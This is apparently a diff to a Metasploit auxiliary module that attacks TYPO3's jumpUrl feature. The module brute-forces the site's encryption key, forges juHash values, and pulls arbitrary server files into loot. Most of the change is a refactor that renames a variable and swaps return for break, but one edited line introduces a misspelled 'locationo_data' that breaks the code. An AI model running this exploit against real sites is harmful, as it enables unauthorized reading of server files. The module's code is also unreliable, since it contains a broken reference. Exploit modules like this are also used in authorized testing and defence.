@@ -44,7 +44,12 @@ class MetasploitModule < Msf::Auxiliary
           }
         ]
       ],
-      'DefaultAction' => 'Short_MD5'
+      'DefaultAction' => 'Short_MD5',
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS],
+        'Reliability' => []
+      }
     )
 
     register_options(
@@ -115,32 +120,33 @@ class MetasploitModule < Msf::Auxiliary
       ]
     end
 
+    success = false
     counter = 0
     encryption_keys.each do |enc_key|
       counter += 1
-      locationData = Rex::Text.rand_text_numeric(1) + '::' + Rex::Text.rand_text_numeric(2)
+      location_data = Rex::Text.rand_text_numeric(1) + '::' + Rex::Text.rand_text_numeric(2)
 
       case action.name
       when 'Short_MD5'
         juarray = "a:3:{i:0;s:#{jumpurl_len}:\"#{jumpurl_enc}\""
-        juarray << ";i:1;s:#{locationData.length}:\"#{locationData}\""
+        juarray << ";i:1;s:#{location_data.length}:\"#{location_data}\""
         juarray << ";i:2;s:#{enc_key.length}:\"#{enc_key}\";}"
         juhash = Digest::MD5.hexdigest(juarray)
         juhash = juhash[0..9] # shortMD5 value for use as juhash
       when 'MIME'
         juarray = "a:4:{i:0;s:#{jumpurl_len}:\"#{jumpurl_enc}\""
-        juarray << ";i:1;s:#{locationData.length}:\"#{locationData}\";i:2;s:0:\"\""
+        juarray << ";i:1;s:#{location_data.length}:\"#{location_data}\";i:2;s:0:\"\""
         juarray << ";i:3;s:#{enc_key.length}:\"#{enc_key}\";}"
         juhash = Digest::MD5.hexdigest(juarray)
         juhash = juhash[0..9] # shortMD5 value for use as juhash
       when 'HMAC_SHA1'
         juarray = "a:3:{i:0;s:#{jumpurl_len}:\"#{jumpurl_enc}\""
-        juarray << ";i:1;s:#{locationData.length}:\"#{locationData}\";i:2;"
+        juarray << ";i:1;s:#{location_data.length}:\"#{location_data}\";i:2;"
         juarray << 's:0:"";}'
         juhash = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('sha1'), enc_key, juarray)
       end
 
-      file_uri = "#{datastore['URI']}/index.php?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=#{juhash}"
+      file_uri = "#{datastore['URI']}/index.php?jumpurl=#{jumpurl}&juSecure=1&locationData=#{location_data}&juHash=#{juhash}"
       file_uri = file_uri.sub('//', '/') # Prevent double // from appearing in uri
       vprint_status("Checking Encryption Key [#{counter}/#{encryption_keys.length}]: #{enc_key}")
 
@@ -155,10 +161,10 @@ class MetasploitModule < Msf::Auxiliary
         }, 25)
       rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
         print_error(e.message)
-        return
+        break
       rescue ::Timeout::Error, ::Errno::EPIPE => e
         print_error(e.message)
-        return
+        break
       end
 
       case file.headers['Content-Type']
@@ -167,31 +173,34 @@ class MetasploitModule < Msf::Auxiliary
         when 'jumpurl Secure: "' + datastore['RFILE'] + '" was not a valid file!'
           print_error("File #{datastore['RFILE']} does not exist.")
           print_good("Discovered encryption key : #{enc_key}")
-          return
-        when 'jumpurl Secure: locationData, ' + locationData + ', was not accessible.'
+          break
+        when 'jumpurl Secure: locationData, ' + locationo_data + ', was not accessible.'
           print_error("File #{datastore['RFILE']} is not accessible.")
           print_good("Discovered encryption key : #{enc_key}")
-          return
+          break
         when 'jumpurl Secure: The requested file was not allowed to be accessed through jumpUrl (path or file not allowed)!'
           print_error("File #{datastore['RFILE']} is not allowed to be accessed through jumpUrl.")
           print_good("Discovered encryption key : #{enc_key}")
-          return
+          break
         end
       when 'application/octet-stream'
+        success = true
         addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB
         print_good("Discovered encryption key : #{enc_key}")
         print_good('Writing local file ' + File.basename(datastore['RFILE'].downcase) + ' to loot')
         store_loot('typo3_' + File.basename(datastore['RFILE'].downcase), 'text/xml', addr, file.body, 'typo3_' + File.basename(datastore['RFILE'].downcase), 'Typo3_winstaller')
-        return
+        break
       else
         if datastore['ENC_KEY'] != ''
           print_error('Encryption Key specified is not correct')
-          return
+          break
         end
       end
     end
 
-    print_error("#{rhost}:#{rport} [Typo3] Failed to retrieve file #{datastore['RFILE']}")
-    print_error("Maybe try checking the ACTIONS - Currently using  #{action.name}")
+    unless success
+      print_error("#{rhost}:#{rport} [Typo3] Failed to retrieve file #{datastore['RFILE']}")
+      print_error("Maybe try checking the ACTIONS - Currently using  #{action.name}")
+    end
   end
 end
